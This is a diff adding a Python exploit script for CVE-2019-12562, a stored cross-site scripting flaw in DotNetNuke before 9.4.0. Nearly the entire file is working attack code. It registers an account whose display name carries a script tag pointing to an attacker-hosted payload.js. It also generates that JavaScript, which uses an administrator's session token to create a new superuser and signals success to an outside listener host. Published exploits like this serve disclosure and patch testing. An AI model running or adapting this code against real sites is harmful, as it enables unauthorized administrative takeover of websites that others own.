@@ -1,0 +1,124 @@
+# Exploit Title: Stored Cross-Site Scripting in DotNetNuke (DNN) Version before 9.4.0
+# Exploit Description : This exploit will add a superuser to target DNN website. 
+# Exploit Condition : Successful exploitation occurs when an admin user visits a notification page.
+# Exploit Author: MAYASEVEN
+# CVE : CVE-2019-12562 (https://www.cvedetails.com/cve/CVE-2019-12562/)
+# Github : https://github.com/MAYASEVEN/CVE-2019-12562
+# Website : https://mayaseven.com
+
+import urllib.request
+from bs4 import BeautifulSoup
+
+####################################################################################################
+################################## Config the variables here #######################################
+####################################################################################################
+TARGET_URL = "http://targetdomain/DotNetNuke"
+USERNAME = "MAYASEVEN"   # At least five characters long
+PASSWORD = "P@ssw0rd" # At least 0 non-alphanumeric characters, At least 7 characters
+EMAIL = "research@mayaseven.com" # Change email to any you want
+# A web server for listening an event
+LISTEN_URL = "http://yourdomain.com:1337"
+#####################################################################################################
+#####################################################################################################
+#####################################################################################################
+
+# Payload to add a superuser to website
+PAYLOAD = "John<script src='"+LISTEN_URL+"/payload.js'></script>"
+FILE_CONTENT = """var token = document.getElementsByName("__RequestVerificationToken")[0].value;
+var xhttp = new XMLHttpRequest();
+var params = "{'firstName':'"""+USERNAME+"""','lastName':'"""+USERNAME+"""','email':'"""+EMAIL+"""','userName':'"""+USERNAME+"""','password':'"""+PASSWORD+"""','question':'','answer':'','randomPassword':false,'authorize':true,'notify':false}";
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        var returnhttp1 = new XMLHttpRequest();
+        returnhttp1.open("GET", '"""+LISTEN_URL+"""/Added_the_user');
+        returnhttp1.send();
+        var xhttp2 = new XMLHttpRequest();
+        var userId = JSON.parse(xhttp.responseText).userId;
+        xhttp2.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                var returnhttp2 = new XMLHttpRequest();
+                returnhttp2.open("GET", '"""+LISTEN_URL+"""/Make_superuser_success');
+                returnhttp2.send();
+            }
+        }
+        xhttp2.open('POST', '"""+TARGET_URL+"""/API/PersonaBar/Users/UpdateSuperUserStatus?userId='+userId+'&setSuperUser=true', true);
+        xhttp2.setRequestHeader('Content-type', 'application/json; charset=UTF-8');
+        xhttp2.setRequestHeader('RequestVerificationToken', token);
+        xhttp2.send(params);
+    }
+};
+xhttp.open('POST', '"""+TARGET_URL+"""/API/PersonaBar/Users/CreateUser', true);
+xhttp.setRequestHeader('Content-type', 'application/json; charset=UTF-8');
+xhttp.setRequestHeader('RequestVerificationToken', token);
+xhttp.send(params);
+"""
+
+def create_payload():
+    # Create a payload.js file
+    f = open("payload.js", "w")
+    f.write(FILE_CONTENT)
+    f.close()
+
+def check_target():
+    global regpage
+    reg = urllib.request.urlopen(TARGET_URL+"/Register")
+    regpage = reg.read().decode("utf8")
+    reg.close()
+    if "dnn" in regpage:
+       return True
+    else: return False
+
+def exploit():
+    # Fetching parameter from regpage
+    soup = BeautifulSoup(regpage, 'html.parser')
+    formhtml = soup.find("div", {"id": "dnn_ctr_Register_userForm"})
+    inputdata = BeautifulSoup(regpage, 'html.parser').findAll("input")
+    param = {}
+    print(" [+] Fetching DNN random parameter name.")
+    for i in soup.select('input[name*="_TextBox"]'):
+        print(" [+]", i["aria-label"],":", i["name"])
+        param[i["aria-label"]] = i["name"]
+    ScriptManager = "dnn$ctr$Register_UP|dnn$ctr$Register$registerButton"
+    __EVENTVALIDATION = soup.find("input", {"id": "__EVENTVALIDATION"})["value"]
+    __VIEWSTATE = soup.find("input", {"id": "__VIEWSTATE"})["value"]
+    __EVENTTARGET = "dnn$ctr$Register$registerButton"
+
+    # Posting data to target
+    headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'}
+    data = {'ScriptManager': ScriptManager, '__EVENTVALIDATION': __EVENTVALIDATION, '__VIEWSTATE': __VIEWSTATE, '__EVENTTARGET': __EVENTTARGET,
+        param['Username']: "dummy_"+USERNAME, param["Password"]: PASSWORD, param["PasswordConfirm"]: PASSWORD, param["DisplayName"]: PAYLOAD, "dummy_"+param["Email"]: EMAIL, '__ASYNCPOST': 'true'}
+    data = urllib.parse.urlencode(data).encode()
+    req = urllib.request.Request(TARGET_URL+"/Register", data=data, headers=headers)
+    response = urllib.request.urlopen(req)
+    if "An email with your details has been sent to the Site Administrator" in response.read().decode("utf8"):
+        create_payload()
+        return True
+    elif "A user already exists" in response.read().decode("utf8"):
+        print(" [!] The user already exists")
+        return False 
+    elif "The Display Name is invalid." in response.read().decode("utf8"):
+        print(" [!] DotNetNuke verion already been patched")
+    else: return False
+
+def main():
+    print("[ Checking the target ]")
+    if(check_target()):
+        print(" [+] Target is DNN website.")
+        print(" [+] URL: %s" % TARGET_URL)
+    else:
+        print(" [!] Target is not DNN website and exploit will not working.")
+        return
+    print("[ Running an exploit ]")
+    if(exploit()):
+        print("[ Successful exploited the target ]")
+        print("> Creating a payload.js file in current directory.")
+        print("> You have to serve the web server and place payload.js on it.")
+        print("> And waiting admin to open a notification then the user will be added.")
+        print("> Username: %s" % USERNAME)
+        print("> Password: %s" % PASSWORD)
+    else:
+        print(" [!] Failed to exploit the target.")
+        return
+
+if(__name__ == "__main__"):
+    main()
